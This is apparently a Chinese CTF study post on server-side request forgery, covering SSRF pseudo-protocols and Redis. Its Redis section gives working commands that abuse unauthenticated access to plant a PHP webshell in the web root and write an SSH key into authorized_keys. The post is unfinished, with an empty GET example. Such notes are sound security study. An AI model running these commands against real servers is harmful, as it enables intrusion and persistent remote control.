---
title: "Server-Side Request Forgery"
date: 2025-04-21 00:00:00 +0800
categories: [Security]
tags: [security, ctf]
---

***
## Server-Side Request Forgery
*恶意伪造服务端请求以攻击内网*

### **SSRF伪协议**
* `http://`


* `file://`


* `dict://`


* `gopher://`
*gopher协议支持发出GET、POST请求：可以先拦截get请求包和post请求包，再构造成符合gopher协议的请求。
利用gopher协议可以攻击内网的 `Redis、Mysql、FastCGI、Ftp` 等，也可以发送 GET、POST 请求，这可以拓宽 `SSRF` 的攻击面。*

`gopher://hostname(主机名或IP地址):port(端口号)/请求方法(get、post等)/path(路径)`
**GET**
```

```

***
### **Redis**
`(Remote Dictionary Server)`
开源的、基于内存的 **键值存储系统**，常被用作数据库、缓存或消息中间件。它支持多种数据结构，并以其高性能、低延迟和丰富的功能而闻名。
#### 典型应用场景

- **缓存加速**：减轻数据库压力（如MySQL+Redis组合）。
- **会话管理**：存储用户登录信息。
- **实时数据分析**：如计数器、排行榜。
- **消息队列**：通过 List 或 Stream 实现异步任务。
- **分布式锁**：通过 `SETNX` 命令实现。

*适合需要快速响应的场景。但其内存限制意味着不适合存储大规模冷数据（此时需配合传统数据库使用）。*

#### **Redis in CTF**

##### Redis未授权访问
*Redis默认绑定在 `0.0.0.0:6379`，且无密码认证时，攻击者可直接连接并操作数据，甚至写入恶意文件（如`Webshell`）。*
```
redis-cli -h ip -p 6379
```
*若无需密码即可连接，说明存在未授权访问。*
```
# 设置键值（内容为PHP代码）
set shell "<?php system($_GET['cmd']); ?>"
# 配置Redis持久化路径为Web目录
config set dir /var/www/html
config set dbfilename shell.php
# 保存数据到文件
save
```
*若Redis运行用户有`~/.ssh/`写入权限，可写入公钥实现免密登录*
```
# 生成密钥对（本地）
ssh-keygen -t rsa
# 将公钥写入Redis
set ssh-key "\n\n<公钥内容>\n\n"
config set dir /home/user/.ssh/
config set dbfilename authorized_keys
save
```
写入木马或`SSH`公钥

##### `With Gopher`